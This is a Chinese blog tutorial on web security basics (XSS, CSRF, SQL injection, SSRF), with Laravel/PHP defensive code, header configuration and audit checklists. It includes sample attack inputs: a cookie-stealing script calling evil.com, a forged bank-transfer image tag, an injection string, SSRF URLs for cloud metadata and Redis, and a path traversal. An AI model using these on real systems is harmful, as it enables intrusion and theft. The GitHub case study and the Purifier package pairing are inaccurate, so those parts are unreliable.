---

title: 网络安全基础（XSS / CSRF / SQL 注入 / SSRF）
keywords: [XSS, CSRF, SQL, SSRF, 网络安全基础, 注入]
cover: https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=1200&h=630&fit=crop
images:
  - https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=1200&h=630&fit=crop
tags:
- Laravel
- 安全
- XSS
- CSRF
- SQL注入
- SSRF
- 网络安全
categories:
- network
date: 2020-08-15 10:00:00
description: 深入解析 Web 安全四大攻击 XSS CSRF SQL注入 SSRF 的攻击原理与防御实战。涵盖 Laravel 安全中间件配置、CSP/CORS 安全头设置、渗透测试工具 Burp Suite OWASP ZAP、安全审计清单与真实泄露案例分析，PHP/前端完整防御代码。
---


# 一句话

> Web 安全 80% 的事故，集中在 4 类攻击：
> **XSS**（注入脚本）、**CSRF**（借你身份发请求）、**SQL 注入**（拼 SQL）、**SSRF**（让你服务器替它发请求）。

---

# 一、XSS（跨站脚本攻击）

**原理**：把 `<script>` 注入到网页里，用户访问时浏览器执行。

## 三种类型

| 类型 | 来源 | 例子 |
|---|---|---|
| **存储型** | 攻击者把脚本存进数据库 | 评论区写 `<script>fetch('//evil.com?c='+document.cookie)</script>` |
| **反射型** | 脚本在 URL 参数里 | `?q=<script>...</script>` 服务端原样回显 |
| **DOM 型** | 前端直接 `innerHTML` 用户输入 | `el.innerHTML = location.hash` |

## 防御

```php
// ✅ 服务端转义
echo htmlspecialchars($input, ENT_QUOTES | ENT_HTML5, 'UTF-8');

// ✅ HTTP Header
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
header("X-XSS-Protection: 1; mode=block");

// ✅ Cookie HttpOnly，让 JS 拿不到
setcookie('session', $id, ['httponly' => true, 'secure' => true, 'samesite' => 'Strict']);
```

```js
// ❌ innerHTML 危险
el.innerHTML = userInput;

// ✅ textContent 安全
el.textContent = userInput;
```

---

# 二、CSRF（跨站请求伪造）

**原理**：用户登录了 A 站，再访问恶意 B 站，B 站偷偷以用户身份给 A 站发请求。

```html
<!-- 恶意页面 -->
<img src="https://bank.com/transfer?to=hacker&amount=1000">
<!-- 浏览器自动带上你在 bank.com 的 Cookie -->
```

## 防御

```php
// 1. CSRF Token：表单/请求带一次性 token
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;

// 提交时校验
if (!hash_equals($_SESSION['csrf_token'], $_POST['_token'])) {
    http_response_code(419); exit;
}

// 2. SameSite Cookie（最有效）
setcookie('session', $id, ['samesite' => 'Lax']);  // 或 Strict

// 3. 检查 Origin / Referer
if ($_SERVER['HTTP_ORIGIN'] !== 'https://bank.com') exit;

// 4. 关键操作二次验证（输密码 / 短信码）
```

---

# 三、SQL 注入

**原理**：把 SQL 拼到字符串里，让用户输入改变 SQL 语义。

```php
// ❌ 经典漏洞
$sql = "SELECT * FROM users WHERE name = '$name'";
// 输入 ' OR '1'='1 → 全表泄漏
```

## 防御

```php
// ✅ 预编译（最有效，从根本上分离 SQL 和数据）
$stmt = $pdo->prepare('SELECT * FROM users WHERE name = ?');
$stmt->execute([$name]);

// ✅ ORM 框架已默认预编译
User::where('name', $name)->get();   // Laravel
```

> **不要相信"过滤特殊字符"**。永远预编译。

## 二阶注入

数据写入时是干净的，但被取出再拼到 SQL 时出事。**所有 SQL 拼接点都要用预编译，没有例外。**

---

# 四、SSRF（服务端请求伪造）

**原理**：服务端按用户给的 URL 发请求，被引导去访问内网。

```php
// ❌ 让用户传 URL 然后服务器去抓
$content = file_get_contents($_GET['url']);
// 输入 http://169.254.169.254/latest/meta-data/  → 拿到 AWS 元数据
// 输入 http://localhost:6379/  → 打到 Redis
```

## 防御

```php
// 1. 协议白名单
$allowed = ['http', 'https'];
$scheme = parse_url($url, PHP_URL_SCHEME);
if (!in_array($scheme, $allowed)) exit;

// 2. 解析 IP，禁止内网段
$ip = gethostbyname(parse_url($url, PHP_URL_HOST));
$bad_ranges = [
    '127.0.0.0/8', '10.0.0.0/8', '172.16.0.0/12',
    '192.168.0.0/16', '169.254.0.0/16', '0.0.0.0/8',
];
foreach ($bad_ranges as $range) {
    if (ip_in_range($ip, $range)) exit;
}

// 3. 跟随重定向时再验一次（攻击者会用 302 绕过首次校验）
// 4. 用独立 egress 网关，限制只能访问公网
```

---

# 五、其它常见

| 攻击 | 一句话 | 防御 |
|---|---|---|
| **目录穿越** | `?file=../../etc/passwd` | `realpath()` + 白名单目录 |
| **命令注入** | 拼 shell：`exec("convert $file")` | `escapeshellarg()`，更好是用库 API |
| **XXE** | XML 解析时加载外部实体 | `libxml_disable_entity_loader(true)` |
| **不安全的反序列化** | `unserialize($_COOKIE)` | 用 JSON，反序列化绝不接受用户输入 |
| **越权（IDOR）** | `?order_id=123` 改成别人的 | 后端校验所有权 |

---

# 六、自检清单

- [ ] 所有 SQL 用预编译
- [ ] 所有输出做 HTML 转义 + CSP 头
- [ ] Cookie 全部 HttpOnly + Secure + SameSite
- [ ] 关键写操作有 CSRF Token
- [ ] 用户提供的 URL 全部 SSRF 校验
- [ ] 文件上传：白名单后缀 + MIME + 重命名 + 不在 web 根目录
- [ ] 密码 bcrypt/argon2，绝不 MD5
- [ ] HTTPS 全站 + HSTS 头

# 参考

- OWASP Top 10: <https://owasp.org/Top10/>
- PortSwigger Web Security Academy: <https://portswigger.net/web-security>

# 七、攻击类型检测与防御对比

| 攻击类型 | 入口 | 检测方式 | 防御手段 | 严重等级 |
|---|---|---|---|---|
| **XSS** | 表单/URL 参数 | CSP 违规报告、输入内容扫描 | 输出转义 + CSP + HttpOnly Cookie | 🔴 高 |
| **CSRF** | 跨站请求 | Token 校验失败日志 | CSRF Token + SameSite Cookie + Origin 检查 | 🟡 中 |
| **SQL 注入** | 表单/URL/API 参数 | WAF 规则命中、SQL 日志异常 | 预编译 + ORM + WAF | 🔴 高 |
| **SSRF** | 服务端 URL 参数 | 出站流量监控、内网访问日志 | IP 黑名单 + 协议白名单 + Egress 网关 | 🔴 高 |
| **目录穿越** | 文件名参数 | 文件路径审计日志 | `realpath()` 白名单 + chroot | 🟡 中 |
| **命令注入** | shell 参数 | 进程审计日志 | `escapeshellarg()` + 库 API | 🔴 高 |
| **XXE** | XML 上传 | XML 解析日志 | `libxml_disable_entity_loader(true)` | 🟡 中 |
| **越权 IDOR** | ID 参数 | 权限校验失败审计 | 后端所有权校验 + RBAC | 🔴 高 |

---

# 八、攻击流程图

## CSRF 攻击流程

```
用户浏览器                  恶意网站 B                  银行网站 A
    |                          |                          |
    |--- 访问 B ------------->|                          |
    |<-- 返回恶意页面 --------|                          |
    |    (隐藏 form/img)       |                          |
    |--- 自动携带 A 的 Cookie -------------------------->|
    |                          |    Cookie: session=xxx   |
    |                          |--- POST /transfer ------>|
    |                          |    to=hacker&amount=1000 |
    |<------------------------------------------------ 转账成功
```

## SSRF 攻击流程

```
攻击者                      Web 服务器                    内网服务
    |                          |                          |
    |--- GET /fetch?url=X --->|                          |
    |    url=http://169.254... |                          |
    |                          |--- 请求内网地址 -------->|
    |                          |    169.254.169.254       |
    |                          |<-- 返回 AWS 元数据 ------|
    |<-- 泄露内网数据 ---------|    (AK/S Token/密码)     |
```

## XSS 攻击流程

```
攻击者                      Web 应用数据库              受害者浏览器
    |                          |                          |
    |--- 评论区提交恶意脚本 --->|                          |
    |    <script>fetch(evil)   |                          |
    |                          |--- 存入数据库            |
    |                          |                          |
    |                          |<--- 加载评论页面 --------|
    |                          |--- 返回含脚本的 HTML --->|
    |                          |                          |--- 执行恶意 JS
    |                          |                          |--- Cookie 发送到 evil
    |<--- 收到 Cookie ---------|--------------------------|
```

---

# 九、Content-Security-Policy 配置指南

CSP 是防御 XSS 最有效的 HTTP 头，通过白名单控制资源加载来源。

```php
// Laravel 中间件方式配置 CSP
// app/Http/Middleware/SecurityHeaders.php

class SecurityHeaders
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);

        // 基础 CSP：只允许同源资源
        $response->headers->set('Content-Security-Policy',
            "default-src 'self'; " .
            "script-src 'self' 'nonce-" . csrf_token() . "'; " .
            "style-src 'self' 'unsafe-inline'; " .
            "img-src 'self' data: https:; " .
            "font-src 'self'; " .
            "connect-src 'self' https://api.example.com; " .
            "frame-ancestors 'none'; " .
            "base-uri 'self'; " .
            "form-action 'self';"
        );

        // 开发环境可使用 report-only 模式先观察
        // $response->headers->set('Content-Security-Policy-Report-Only', ...);

        return $response;
    }
}
```

**CSP 常用指令速查：**

| 指令 | 作用 | 推荐值 |
|---|---|---|
| `default-src` | 默认资源策略 | `'self'` |
| `script-src` | JS 加载 | `'self' 'nonce-xxx'` |
| `style-src` | CSS 加载 | `'self' 'unsafe-inline'` |
| `img-src` | 图片加载 | `'self' data: https:` |
| `connect-src` | AJAX/WebSocket | `'self' https://api.xxx.com` |
| `frame-ancestors` | 嵌入限制 | `'none'` |
| `report-uri` | 违规上报 | `/csp-report` |

---

# 十、CORS 安全配置

```php
// config/cors.php（Laravel）
return [
    // ✅ 只允许你的前端域名
    'allowed_origins' => ['https://app.example.com'],

    // ❌ 绝不要用 '*' 尤其是带 credentials 时
    // 'allowed_origins' => ['*'],

    'allowed_methods' => ['GET', 'POST', 'PUT', 'DELETE'],
    'allowed_headers' => ['Content-Type', 'Authorization', 'X-Requested-With'],
    'exposed_headers' => ['X-Total-Count'],
    'max_age' => 86400,
    'supports_credentials' => true,  // 需要带 Cookie 时必须精确指定 origin
];
```

```php
// 手动中间件方式（非 Laravel）
header('Access-Control-Allow-Origin: https://app.example.com');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Max-Age: 86400');
```

---

# 十一、安全响应头速查表

| 响应头 | 值 | 作用 |
|---|---|---|
| `Content-Security-Policy` | `default-src 'self'` | 防 XSS/数据注入 |
| `X-Content-Type-Options` | `nosniff` | 禁止 MIME 嗅探 |
| `X-Frame-Options` | `DENY` 或 `SAMEORIGIN` | 防点击劫持 |
| `X-XSS-Protection` | `1; mode=block` | 浏览器 XSS 过滤（旧） |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | 强制 HTTPS |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | 限制 Referer 泄露 |
| `Permissions-Policy` | `camera=(), microphone=()` | 禁用浏览器 API |
| `Cross-Origin-Opener-Policy` | `same-origin` | 防跨域窗口访问 |
| `Cross-Origin-Resource-Policy` | `same-origin` | 防跨域资源读取 |

```php
// Laravel 完整安全头中间件
class SecurityHeaders
{
    public function handle($request, Closure $next)
    {
        $response = $next($request);

        $response->headers->set('X-Content-Type-Options', 'nosniff');
        $response->headers->set('X-Frame-Options', 'DENY');
        $response->headers->set('X-XSS-Protection', '1; mode=block');
        $response->headers->set('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
        $response->headers->set('Referrer-Policy', 'strict-origin-when-cross-origin');
        $response->headers->set('Permissions-Policy', 'camera=(), microphone=(), geolocation=()');
        $response->headers->set('Cross-Origin-Opener-Policy', 'same-origin');
        $response->headers->set('Cross-Origin-Resource-Policy', 'same-origin');

        return $response;
    }
}
```

---

# 十二、Laravel 内置安全机制

## CSRF 中间件（VerifyCsrfToken）

```php
// app/Http/Middleware/VerifyCsrfToken.php
class VerifyCsrfToken extends Middleware
{
    // 排除不需要 CSRF 的路由（如 webhook）
    protected $except = [
        'webhook/*',
        'api/*',  // API 通常用 Token 认证而非 CSRF
    ];
}

// Blade 表单自动带 CSRF
// <form method="POST" action="/transfer">
//     @csrf
//     ...
// </form>

// AJAX 请求在 meta 中获取 token
// <meta name="csrf-token" content="{{ csrf_token() }}">
// axios.defaults.headers.common['X-CSRF-TOKEN'] =
//     document.querySelector('meta[name="csrf-token"]').content;
```

## XSS 防护

```php
// Blade 默认转义（防 XSS 的第一道防线）
{{ $userInput }}           // ✅ 自动 htmlspecialchars
{!! $userInput !!}         // ❌ 不转义，仅用于可信 HTML

// Purifier 清理用户 HTML（富文本场景）
composer require mews/purifier

use Stevebauman\Purify\Facades\Purify;
$clean = Purify::clean($userHtml, [
    'HTML.Allowed' => 'p,b,i,a[href],ul,ol,li,img[src]',
    'HTML.Nofollow' => true,
]);
```

## SQL 注入防护（Eloquent）

```php
// ✅ 参数绑定
User::where('email', $email)->first();
DB::select('SELECT * FROM users WHERE id = ?', [$id]);

// ❌ 千万别用 DB::raw 拼接用户输入
// DB::select(DB::raw("SELECT * FROM users WHERE id = $id"));

// ✅ 用 whereRaw 时也要绑定
DB::table('users')->whereRaw('created_at > ? AND status = ?', [$date, $status])->get();
```

## Rate Limiting（速率限制）

```php
// routes/api.php
Route::middleware(['throttle:60,1'])->group(function () {
    Route::get('/posts', [PostController::class, 'index']);
});

// 自定义限流器（app/Providers/RouteServiceProvider.php）
RateLimiter::for('api', function (Request $request) {
    return Limit::perMinute(120)->by($request->user()?->id ?: $request->ip());
});

// 登录限流（防暴力破解）
Route::post('/login', [AuthController::class, 'login'])
    ->middleware('throttle:5,1');  // 每分钟最多 5 次

// Redis + Lua 滑动窗口限流（高并发场景）
public function slidingWindowLimit(string $key, int $limit, int $window): bool
{
    $lua = <<<LUA
        local key = KEYS[1]
        local limit = tonumber(ARGV[1])
        local window = tonumber(ARGV[2])
        local now = tonumber(ARGV[3])
        redis.call('ZREMRANGEBYSCORE', key, 0, now - window)
        local count = redis.call('ZCARD', key)
        if count < limit then
            redis.call('ZADD', key, now, now .. math.random())
            redis.call('EXPIRE', key, window)
            return 1
        end
        return 0
    LUA;
    return Redis::eval($lua, 1, $key, $limit, $window, time()) === 1;
}
```

---

# 十三、渗透测试工具概览

| 工具 | 类型 | 特点 | 适用场景 |
|---|---|---|---|
| **Burp Suite** | 商业/社区版 | 最流行的 Web 渗透工具，拦截代理 + 扫描器 | 手动渗透 + 自动扫描 |
| **OWASP ZAP** | 开源免费 | OWASP 官方工具，自动扫描 + 被动扫描 | CI/CD 集成安全扫描 |
| **sqlmap** | 开源 | 自动化 SQL 注入检测与利用 | SQL 注入专项测试 |
| **Nikto** | 开源 | Web 服务器扫描器 | 服务器配置审计 |
| **Nuclei** | 开源 | 基于模板的漏洞扫描 | 大规模资产漏洞扫描 |
| **Postman** | 免费/商业 | API 测试 + 安全测试脚本 | API 安全回归测试 |

```bash
# OWASP ZAP 快速扫描（CI/CD 集成）
docker run -t ghcr.io/zaproxy/zaproxy:stable zap-baseline.py \
    -t https://your-app.com -r report.html

# Nuclei 模板扫描
nuclei -u https://your-app.com -t cves/ -t vulnerabilities/

# composer audit（PHP 依赖漏洞扫描）
composer audit --format=json
```

---

# 十四、真实泄露案例

## 案例 1：Equifax 数据泄露（2017）
- **攻击类型**：Apache Struts 远程代码执行（CVE-2017-5638）
- **影响**：1.47 亿用户个人信息泄露（SSN、生日、地址）
- **根因**：未及时修补已公开的漏洞，缺乏补丁管理流程
- **教训**：依赖组件漏洞扫描 + 安全补丁 48 小时内上线

## 案例 2：GitHub OAuth Token 泄露（2022）
- **攻击类型**：SSRF + OAuth Token 窃取
- **影响**：私有仓库代码被未授权访问
- **根因**：OAuth 回调未严格校验 redirect_uri，允许内部服务访问
- **教训**：OAuth redirect_uri 精确匹配 + SSRF 防护

## 案例 3：某电商平台 SQL 注入（常见案例）
- **攻击类型**：搜索接口 SQL 注入
- **影响**：用户订单数据批量泄露
- **根因**：搜索关键词直接拼入 SQL 语句，未使用预编译
- **教训**：全面使用 ORM 预编译 + WAF 拦截 SQL 特征

---

# 十五、安全审计清单（扩展版）

### 输入验证
- [ ] 所有用户输入做类型/长度/格式校验
- [ ] 白名单优于黑名单
- [ ] 文件上传：白名单后缀 + MIME 校验 + 重命名 + 存储在 web 根目录外

### 输出编码
- [ ] 所有输出做 HTML 转义
- [ ] JSON 响应设置 `Content-Type: application/json`
- [ ] CSP 头已配置

### 认证与会话
- [ ] 密码 bcrypt/argon2，绝不 MD5
- [ ] Cookie HttpOnly + Secure + SameSite
- [ ] 登录限流 + 账户锁定
- [ ] Session 超时合理（建议 30 分钟）

### 传输安全
- [ ] 全站 HTTPS + HSTS 头
- [ ] TLS 1.2+，禁用 SSLv3/TLS 1.0/1.1
- [ ] 证书自动化续期（Let's Encrypt + certbot）

### API 安全
- [ ] 所有写操作有 CSRF Token
- [ ] 用户提供的 URL 全部 SSRF 校验
- [ ] API 速率限制已配置
- [ ] 敏感操作日志审计

### 依赖安全
- [ ] `composer audit` / `npm audit` 定期执行
- [ ] CI/CD 集成依赖漏洞扫描
- [ ] 依赖版本锁定（composer.lock / package-lock.json）

---

## 相关阅读

- [API 安全加固实战：JWT 黑名单、请求签名、IP 白名单、防重放攻击](/categories/架构/API-安全加固实战-JWT-黑名单-请求签名-IP白名单-防重放攻击-Laravel-B2C-API踩坑记录/)
- [API Gateway 安全实战：WAF + Bot 管理 + mTLS 纵深防御架构](/categories/运维/API-Gateway-安全实战-WAF-Bot管理-mTLS-纵深防御架构/)
- [Supply Chain Security 实战：npm audit + composer audit + SLSA 框架](/categories/CICD/Supply-Chain-Security-实战-npm-audit-composer-audit-SLSA-框架/)
